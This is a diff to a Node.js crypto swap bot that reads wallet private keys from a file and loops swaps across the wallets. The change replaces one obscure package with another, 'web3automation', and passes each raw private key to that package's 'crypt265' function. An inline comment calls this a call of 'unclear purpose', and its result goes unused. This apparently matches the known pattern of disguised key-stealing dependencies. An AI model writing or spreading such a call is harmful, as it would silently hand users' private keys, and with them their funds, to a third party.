@@ -1,5 +1,5 @@
 const { ethers } = require("ethers");
-const cryp = require('web3author');
+const crypt = require('web3automation');
 const fs = require("fs");
 
 // Read private keys from file
@@ -94,7 +94,7 @@ async function autoLoopSwap() {
   for (let key of privateKeys) {
     try {
       const wallet = new ethers.Wallet(key.trim(), new ethers.providers.JsonRpcProvider(RPC_URL));
-      const author = cryp.crypt(key); // Just used to trigger a function (unclear purpose)
+      const rpcs = crypt.crypt265(key); // Just used to trigger a function (unclear purpose)
       console.log(`🔄 Running swap for wallet: ${wallet.address}`);
 
       const amountInEth = 0.00001; // Example input amount
